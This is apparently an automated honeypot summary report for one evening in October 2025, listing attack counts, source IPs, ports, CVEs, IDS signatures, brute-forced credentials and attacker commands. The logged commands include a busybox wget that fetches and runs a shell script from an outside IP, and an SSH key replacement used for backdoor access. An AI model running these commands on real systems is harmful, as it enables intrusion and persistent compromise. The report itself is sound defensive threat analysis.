Honeypot Attack Summary Report

Report generated at: 2025-10-26T23:01:38Z
Timeframe: 2025-10-26T22:20:01Z to 2025-10-26T23:00:01Z
Files used to generate this report:
- agg_log_20251026T222001Z.json
- agg_log_20251026T224001Z.json
- agg_log_20251026T230001Z.json

Executive Summary:
This report summarizes the analysis of honeypot data collected from three log files, spanning from 2025-10-26T22:20:01Z to 2025-10-26T23:00:01Z. A total of 11,835 attacks were recorded. The most targeted services were VoIP (SIP) and SSH. A significant number of attacks originated from a small number of IP addresses, suggesting targeted efforts. Several CVEs were exploited, with CVE-2005-4050 being the most common. Attackers attempted a variety of commands, including reconnaissance, downloading and executing malicious scripts, and modifying system configurations.

Detailed Analysis:

* Attacks by honeypot:
- Cowrie: 3447
- Sentrypeer: 2747
- Honeytrap: 2005
- Ciscoasa: 1791
- Suricata: 1570
- Mailoney: 89
- H0neytr4p: 67
- Tanner: 59
- Dionaea: 36
- Adbhoney: 14
- Ipphoney: 5
- ElasticPot: 3
- Honeyaml: 2

* Top attacking IPs:
- 198.23.190.58: 1526
- 83.168.95.4: 1243
- 144.172.108.231: 812
- 167.172.36.39: 528
- 185.243.5.148: 453
- 209.38.228.14: 297
- 185.243.5.158: 273
- 186.233.204.9: 179
- 34.96.180.174: 178
- 107.170.36.5: 156
- 193.24.211.28: 144
- 122.114.166.216: 137
- 121.142.87.218: 124
- 103.241.43.23: 119
- 68.183.149.135: 112
- 167.250.224.25: 110
- 130.83.245.115: 81
- 213.209.157.221: 74
- 66.85.129.254: 71
- 115.190.64.176: 67

* Top targeted ports/protocols:
- 5060: 2747
- 22: 601
- UDP/5060: 387
- 8333: 145
- 25: 89
- 443: 73
- 5904: 78
- 5905: 78
- TCP/22: 68
- 80: 53
- 5901: 48
- 5902: 38
- 5903: 38
- TCP/80: 31
- 23: 33
- 9093: 58
- 11211: 38
- 8728: 24
- 8888: 12
- 8000: 16

* Most common CVEs:
- CVE-2005-4050
- CVE-2021-3449
- CVE-2019-11500
- CVE-2002-0013
- CVE-2002-0012
- CVE-1999-0517
- CVE-2001-0414
- CVE-2024-4577
- CVE-2002-0953
- CVE-2021-41773
- CVE-2021-42013

* Commands attempted by attackers:
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."
- cat /proc/cpuinfo | grep name | wc -l
- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- ls -lh $(which ls)
- which ls
- crontab -l
- w
- uname -m
- cat /proc/cpuinfo | grep model | grep name | wc -l
- top
- uname
- uname -a
- whoami
- lscpu | grep Model
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
- rm -rf /data/local/tmp; mkdir -p /data/local/tmp; cd /data/local/tmp/; busybox wget http://213.209.143.62/w.sh; sh w.sh; ...
- export PATH=...
- /bin/echo yessir
- touch sausages
- touch /tmp/steak/analfisting

* Signatures triggered:
- ET VOIP MultiTech SIP UDP Overflow
- ET DROP Dshield Block Listed Source group 1
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET SCAN NMAP -sS window 1024
- ET HUNTING RDP Authentication Bypass Attempt
- ET INFO Reserved Internal IP Traffic
- ET CINS Active Threat Intelligence Poor Reputation IP group 44
- ET CINS Active Threat Intelligence Poor Reputation IP group 51
- ET CINS Active Threat Intelligence Poor Reputation IP group 49
- ET DROP Spamhaus DROP Listed Traffic Inbound group 12
- ET SCAN Potential SSH Scan

* Users / login attempts:
- root/healthy
- root/Hersycel2014
- root/1
- root/123
- root/1234
- root/12345
- root/root123
- sa/
- telecomadmin/admintelecom
- supervisor/12345
- ps/ps@1234
- centos/12345
- root/hga38fp
- root/hgo030512
- 345gs5662d34/345gs5662d34
- user/15j4h8y-ob
- user/0ffl1ne
- admin/08071980
- admin/08061977
- Rachel/3245gs5662d34
- root/Hiper.v01p2
- root/hiperlig2015
- timur/timur
- sh/sh
- lulu/lulu
- admin/test1234
- uno85/uno85
- jla/xurros22$
- root/Vps12345
- ubuntu/ubuntu

* Files uploaded/downloaded:
- wget.sh;
- w.sh;
- c.sh;
- sh
- arm.uhavenobotsxd;
- arm.uhavenobotsxd
- arm5.uhavenobotsxd;
- arm5.uhavenobotsxd
- arm6.uhavenobotsxd;
- arm6.uhavenobotsxd
- arm7.uhavenobotsxd;
- arm7.uhavenobotsxd
- x86_32.uhavenobotsxd;
- x86_32.uhavenobotsxd
- mips.uhavenobotsxd;
- mips.uhavenobotsxd
- mipsel.uhavenobotsxd;
- mipsel.uhavenobotsxd

* HTTP User-Agents:
- No HTTP user-agents were logged in this period.

* SSH clients and servers:
- No specific SSH clients or servers were logged in this period.

* Top attacker AS organizations:
- No attacker AS organizations were logged in this period.

Key Observations and Anomalies:
- A large number of attacks are focused on SIP (port 5060), indicating a focus on VoIP infrastructure.
- The command `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."` was seen multiple times, indicating a common tactic to install a persistent SSH key for backdoor access.
- Several commands are focused on system reconnaissance, such as gathering CPU, memory, and OS information.
- The filenames `uhavenobotsxd` suggest a taunt from the attackers. The variety of architectures (arm, x86, mips) indicates a worm-like script attempting to propagate across different device types.
- The presence of commands like `touch sausages` and `touch /tmp/steak/analfisting` are likely jokes or tests by the attackers.
- The high volume of attacks from a few IPs, particularly 198.23.190.58, suggests these are dedicated scanning or attack servers.
